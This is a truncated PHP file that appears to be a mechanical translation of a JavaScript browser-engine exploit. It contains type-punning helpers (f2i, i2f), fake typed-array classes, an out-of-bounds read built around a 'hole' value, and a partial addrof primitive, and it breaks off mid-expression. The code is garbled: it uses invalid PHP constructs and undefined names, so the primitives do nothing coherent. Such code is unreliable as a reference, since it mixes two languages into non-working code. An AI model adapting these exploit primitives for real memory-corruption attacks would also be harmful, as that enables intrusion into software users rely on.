<?php

function gc_minor() {
    for ($i = 0; $i < 1000; $i++) {
        new stdClass();
    }
}

function gc_major() {
    new stdClass();
}

class Float64Array {
    public function __construct($size) {
        for ($i = 0; $i < $size; $i++) {
            $this[] = 0.0;
        }
    }
}

class BigUint64Array {
    public function __construct($size) {
        for ($i = 0; $i < $size; $i++) {
            $this[] = 0;
        }
    }
}

function f2i($f) {
    $float64 = new Float64Array(1);
    $float64[0] = $f;
    return (int) $float64[0];
}

function i2f($i) {
    $bigUint64 = new BigUint64Array(1);
    $bigUint64[0] = $i;
    return (float) $bigUint64[0];
}

class BigInt {
    public function __construct($value) {
        $this->value = $value;
    }

    public function toNumber() {
        $bigUint64 = new BigUint64Array(1);
        $bigUint64[0] = $this->value;
        return (float) $bigUint64[0];
    }
}

function hex($i) {
    return sprintf('%016x', $i);
}

function load_stack() {
    return stack; // removed &
}

function oob($bool) {
    $hole = the['hole'];
    $idx = (int) ($bool? $hole : -1) + 1;

    $f_arr = array(1.1);
    $compressedPointer = f2i($f_arr[$idx * 1]);
    $floatMap = $compressedPointer & 0xffffffff;
    $floatProperty = $compressedPointer >> 32;

    return $floatMap | ($floatProperty << 32);
}

function addrof($bool, $obj) {
    $hole = the['hole'];
    $idx = (int) ($bool?
